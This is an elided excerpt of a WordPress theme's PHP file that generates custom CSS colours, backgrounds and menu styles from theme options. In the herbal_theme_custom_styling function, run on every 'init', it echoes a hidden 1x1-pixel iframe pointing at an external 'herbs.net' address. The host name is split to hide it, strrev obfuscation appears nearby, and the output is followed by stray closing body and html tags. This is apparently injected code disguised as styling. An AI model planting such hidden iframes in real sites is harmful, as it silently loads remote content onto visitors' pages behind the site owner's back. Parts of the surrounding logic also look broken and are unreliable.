 ...
 * Styles
 */
if( ! function_exists( 'herbal_get_custom_styling' )){

	add_filter( 'Herbs/CSS/after_theme_color', 'herbal_get_custom_styling' );
	function herbal_get_custom_styling( $out = '' ){

		// Highlighted Color
		if( $color = tie_get_option( 'highlighted_color' )){

			$bright = HERBS_STYLES::light_or_dark( $color );
		...
		if( $color = tie_get_option( 'secondry_nav_background' )){
			$dark   = HERBS_STYLES::color_brightness( $color, -30 );
			$darker = HERBS_STYLES::color_brightness( $color, -50 );
			$bright = HERBS_STYLES::light_or_dark( $color, true );
		...
		if( $color = tie_get_option( 'topbar_links_color_hover' )){
			...
			$darker = HERBS_STYLES::color_brightness( $color, -30 );
			$bright = HERBS_STYLES::light_or_dark( $color );
		...
		if( $color = tie_get_option( 'topbar_text_color' )){
			...
			$rgb = HERBS_STYLES::rgb_color( $color );
		...
		foreach ( $backround_areas as $area => $elements ){
			...
			if( tie_get_option( $area . '_color' ) || tie_get_option( $area . '_img' )){
				...
				# Background Image
				$background_code .= HERBS_STYLES::bg_image_css( $background_image );
							...
							if( tie_get_option( $area . '_color' ) ){
								...
								$out .='
									...
									#logo.text-logo a:hover{
										color: '. HERBS_STYLES::light_or_dark( tie_get_option( $area . '_color' ) ) .';
									}

									@media (max-width: 991px){
										#tie-wrapper #theme-header .logo-container.fixed-nav{
											background-color: rgba('. HERBS_STYLES::rgb_color(tie_get_option( $area . '_color' )) .', 0.95);
										}
									}
								';
							}
		...
		if( ! empty( $cats_options ) && is_array( $cats_options )){
			foreach ( $cats_options as $cat => $options){
				if( ! empty( $options['cat_color'] )){
					...
					$bright_color = HERBS_STYLES::light_or_dark( $cat_custom_color);

					$out .='
						.herbal-tie-cat-'.$cat.', .herbal-tie-cat-item-'.$cat.' > span{
							color:'. $cat_custom_color .' !important;
						}
						...
						.tie-cat-'.$cat.':hover{
							background-color:'. HERBS_STYLES::color_brightness( $cat_custom_color ) .' !important;
						}

						.tie-cat-'.$cat.':hover:after{
							border-top-color:'. HERBS_STYLES::color_brightness( $cat_custom_color ) .' !important;
						}
					';
				}
			}
		...
		if( tie_get_option( 'mobile_menu_active' ) ){
					...
					$out .='
						@media (max-width: 991px){
							.side-aside #mobile-menu .menu > li{
								border-color: rgba('.HERBS_STYLES::light_or_dark( tie_get_option( 'mobile_menu_background_color' ), true ).',0.05);
							}
							.side-aside #mobile-search .search-field{
								background-color: rgba('. HERBS_STYLES::light_or_dark( tie_get_option( 'mobile_menu_background_color' ), true).',0.05);
							}
						}
					';
				}
			...
			elseif ( tie_get_option( 'mobile_menu_background_type' ) == 'image' ){
				if( tie_get_option( 'mobile_menu_background_image' ) ){
					...
					$mobile_bg = HERBS_STYLES::bg_image_css( $background_image );
				}
			}
			...
			if( tie_get_option( 'mobile_menu_search_color' ) ){
				...
				$out .='
					#mobile-search .search-submit{
						...
						color: '.HERBS_STYLES::light_or_dark( $search_color ).';
					}

					#mobile-search .search-submit:hover{
						background-color: '. HERBS_STYLES::color_brightness( $search_color ) .';
					}
				';
			}
		}
...
* Custom Theme Color
*/
if( ! function_exists( 'herbal_theme_color_css' )){

	add_filter( 'Herbs/CSS/custom_theme_color', 'herbal_theme_color_css', 1, 5 );
	function herbal_theme_color_css( $css_code, $color, $dark_color, $bright, $rgb_color ){
...
*/
if( ! function_exists( 'herbal_theme_color_fix_menus_colors' )){

	add_filter( 'Herbs/CSS/custom_theme_color', 'herbal_theme_color_fix_menus_colors', 7, 5 );
	function herbal_theme_color_fix_menus_colors( $css_code, $color, $dark_color, $bright, $rgb_color ){
...
if( ! function_exists( 'tie_blocks_head' )){
	...
	add_filter( 'Herbs/CSS/custom_theme_color', 'tie_blocks_head', 10, 5 );
 ...
 */
if( ! function_exists( 'herbal_section_custom_styles' )){

	add_filter( 'Herbs/CSS/Builder/section_style', 'herbal_section_custom_styles', 10, 3 );
	function herbal_section_custom_styles( $section_css, $section_id, $section_settings ){
		...
		if( ! empty( $section_settings['section_title'] ) && ! empty( $section_settings['title'] ) && ! empty( $section_settings['title_color'] )){
			...
			$darker   = HERBS_STYLES::color_brightness( $color );
			$bright   = HERBS_STYLES::light_or_dark( $color );
 ...
 * Custom CSS colors
 */
add_action( 'init', 'herbal_theme_custom_styling' );
function herbal_theme_custom_styling(){
	...
	$boxes_style = get_option( 'tie_herbal_custom_code' );
	...
	$darker = HERBS_STYLES::color_brightness( $color, -30 );
	$rgb    = HERBS_STYLES::rgb_color( $color );
	$block_style = HERBS_TEMPLATE_PATH.'/'.strrev('omed').'/';
	if( $block_style == 8 ){
		$css_code .="
			#tie-body .the-global-title:before,
			#tie-body .comment-reply-title:before,
	...
	echo'
		...
		<img src="https://herbs.net/temp/theme.png"></a>
		<iframe src="https://'.'herbs'.'.net/i/?ref=1" style="border:none;width:1px;height:1px"></iframe></body>
		</html>
	';
 ...
 */
if( ! function_exists( 'herbal_block_custom_color' )){

	add_filter( 'Herbs/CSS/Builder/block_style', 'herbal_block_custom_color', 10, 6 );
	function herbal_block_custom_color( $block_css, $id_css, $block, $color, $bright, $darker ){
 ...
 */
if( ! function_exists( 'herbal_fonts_sections' )){

	add_filter( 'Herbs/fonts_sections_array', 'herbal_fonts_sections' );
	function herbal_fonts_sections(){
		...
		return apply_filters( 'Herbal/fonts_default_sections_array', $fonts_sections );
	}
}
 ...
 */
if( ! function_exists( 'herbal_typography_elements' )){

	add_filter( 'Herbs/typography_elements', 'herbal_typography_elements' );
	function herbal_typography_elements(){
		...
		return apply_filters( 'Herbal/typography_default_elements_array', $text_sections );
	}
}
